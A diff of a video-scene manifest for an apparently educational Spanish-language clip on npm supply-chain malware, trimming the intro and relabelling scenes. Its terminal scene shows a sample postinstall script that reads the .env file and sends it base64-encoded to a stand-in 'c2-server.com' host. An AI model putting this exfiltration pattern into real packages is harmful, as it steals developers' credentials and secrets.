@@ -6,33 +6,11 @@ window.__DEFAULT_MANIFEST__ = {
   "fps": 30,
   "scenes": [
     {
-      "id": "hook_security",
-      "type": "kinetic_hook",
-      "duration": 4.5,
-      "voiceover": "¿Sabías que ejecutar npm install puede darle acceso total a tu computadora a un hacker? Así funciona un ataque de supply chain en 2026.",
-      "visual_cue": "Gancho cinético sobre malware en dependencias",
-      "props": {
-        "badge": "CIBERSEGURIDAD 2026",
-        "lines": [
-          {
-            "text": "ANATOMÍA DE UN",
-            "color": "#ffffff"
-          },
-          {
-            "text": "MALWARE EN NPM",
-            "color": "#ef4444"
-          }
-        ],
-        "subtitle": "ROBO DE SECRETOS VIA SCRIPTS POSTINSTALL",
-        "icon": "zero_trust_lock"
-      }
-    },
-    {
-      "id": "exploit_code",
+      "id": "postinstall_code_hook",
       "type": "code_terminal",
       "duration": 6.5,
-      "voiceover": "El paquete parece una utilidad inofensiva, pero su script postinstall lee tus variables de entorno y las envía codificadas a un servidor externo.",
-      "visual_cue": "Terminal mostrando el payload malicioso oculto en package.json",
+      "voiceover": "Ejecutar npm install puede darle acceso total a tus claves privadas a un atacante. Así roba un script postinstall tus variables de entorno.",
+      "visual_cue": "Apertura directa con terminal mostrando el payload malicioso oculto en package.json",
       "props": {
         "header": "PAYLOAD DEL ATACANTE",
         "title": "SCRIPT POSTINSTALL OFUSCADO",
@@ -43,7 +21,7 @@ window.__DEFAULT_MANIFEST__ = {
           "    const env = fs.readFileSync('.env', 'utf8');",
           "    https.get('https://c2-server.com/leak?d=' + Buffer.from(env).toString('base64'));\\\"\"",
           "}",
-          "// Las claves de AWS, Stripe y bases de datos quedan expuestas"
+          "# Las claves de AWS, Stripe y bases de datos quedan expuestas"
         ],
         "cursorLine": 4
       }
@@ -61,8 +39,8 @@ window.__DEFAULT_MANIFEST__ = {
         "stages": [
           {
             "id": "dev",
-            "label": "TERMINAL DEL DESARROLLADOR",
-            "sub": "npm install ejecutado con permisos root/locales",
+            "label": "TERMINAL LOCAL",
+            "sub": "npm install ejecutado con permisos completos",
             "y": 220,
             "color": "#ef4444",
             "metric": "Comprometido"
@@ -78,7 +56,7 @@ window.__DEFAULT_MANIFEST__ = {
           {
             "id": "c2",
             "label": "SERVIDOR DEL ATACANTE",
-            "sub": "Extracción automática de AWS_SECRET_ACCESS_KEY",
+            "sub": "Extracción de AWS_SECRET_ACCESS_KEY",
             "y": 820,
             "color": "#a855f7",
             "metric": "Claves robadas"
@@ -93,10 +71,10 @@ window.__DEFAULT_MANIFEST__ = {
       "voiceover": "Audito la seguridad de dependencias y diseño pipelines Zero-Trust para empresas que quieren blindar su código. Link en mi biografía.",
       "visual_cue": "Cierre con auditoría de seguridad de dependencias",
       "props": {
-        "header": "AUDITORÍA DE SEGURIDAD & SUPPLY CHAIN",
+        "header": "AUDITORÍA DE SEGURIDAD",
         "title": "PROTEGE TU CADENA DE SUMINISTRO",
         "cta": {
-          "badge": "AUDITORÍA DE SEGURIDAD // SEDEV",
+          "badge": "AUDITORÍA DE SEGURIDAD (Link en bio)",
           "text": "¿Revisas qué ejecutan tus paquetes de NPM? Link en mi perfil para auditar tu pipeline."
         }
       }
